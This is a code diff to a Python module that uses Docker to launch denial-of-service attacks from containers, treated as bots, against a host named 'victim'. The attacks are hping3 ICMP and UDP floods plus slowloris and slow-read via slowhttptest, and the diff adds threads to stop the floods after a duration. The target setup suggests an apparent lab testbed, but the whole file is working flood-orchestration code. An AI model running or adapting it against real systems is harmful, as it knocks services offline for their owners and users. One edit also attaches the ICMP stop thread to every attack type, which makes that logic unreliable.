@@ -12,6 +12,7 @@ def icmp_flood(container_id, ip_address=None):
         )
     else:
         result = container.exec_run("hping3 --icmp --flood victim")
+
     print(result.output.decode())
 
 
@@ -26,14 +27,14 @@ def udp_flood(container_id, ip_address):
     print(result.output.decode())
 
 
-def slowloris(container_id, number_of_connections, connection_rate, attack_duration):
+def slowloris(container_id, attack_duration, number_of_connections, connection_rate):
     container = client.containers.get(container_id)
     result = container.exec_run(
         f"slowhttptest -c {number_of_connections} -r {connection_rate} -l {attack_duration} -g -u http://victim"
     )
     print(result.output.decode())
 
-def slow_read(container_id, number_of_connections, connection_rate, attack_duration, pipeline_factor, read_interval, read_bytes, window_size_start, window_size_end):
+def slow_read(container_id, attack_duration, number_of_connections, connection_rate, pipeline_factor, read_interval, read_bytes, window_size_start, window_size_end):
     container = client.containers.get(container_id)
     result = container.exec_run(
         f"slowhttptest  -X -k {pipeline_factor} -c {number_of_connections} -r {connection_rate} -l {attack_duration} -n {read_interval} -z {read_bytes} -w {window_size_start} -y {window_size_end} -g -u http://victim"
@@ -65,6 +66,17 @@ def execute_attack(attack, duration, *args):
 
     return "Attack finished"
 
+def stop_attack(container_id):
+    container = client.containers.get(container_id)
+    result = container.exec_run("pkill hping3")
+    print(result.output.decode())
+
+def stop_icmp_flood(container_id, attack_duration):
+    time.sleep(attack_duration)
+    container = client.containers.get(container_id)
+    result = container.exec_run("pkill hping3")
+    print(result.output.decode())
+
 def execute_attacks(attack_info, attack_duration):
     container_ids = [x[0] for x in db.get_bot_ids()]
 
@@ -91,29 +103,14 @@ def execute_attacks(attack_info, attack_duration):
         for container_id in containers:
             attack_thread = threading.Thread(target=globals().get(attack), args=(container_id, *args))
             attack_threads.append(attack_thread)
-            attack_thread.start()
+            attack_threads.append(threading.Thread(target=stop_icmp_flood, args=(container_id, attack_duration)))
 
-        # Wait for the specified duration for icmp_flood attack
-        if attack == 'icmp_flood':
-            time.sleep(attack_duration)
-
-            # Stop icmp flood after duration
-            for container_id in containers:
-                stop_thread = threading.Thread(target=stop_attack, args=(container_id,))
-                stop_thread.start()
+    # Start all attack threads
+    for attack_thread in attack_threads:
+        attack_thread.start()
 
     # Wait for all threads to finish
     for attack_thread in attack_threads:
         attack_thread.join()
+
     return "Attacks finished"
-def stop_attack(container_id):
-    container = client.containers.get(container_id)
-    result = container.exec_run("pkill hping3")
-    print(result.output.decode())
-
-
-# def hping_duration(container_id, duration): # Hping3 itself doesnt have flag for duration set, this is for it
-#     while duration > 0:
-#             time.sleep(1)
-#             duration -= 1
-#     stop_attack(container_id)
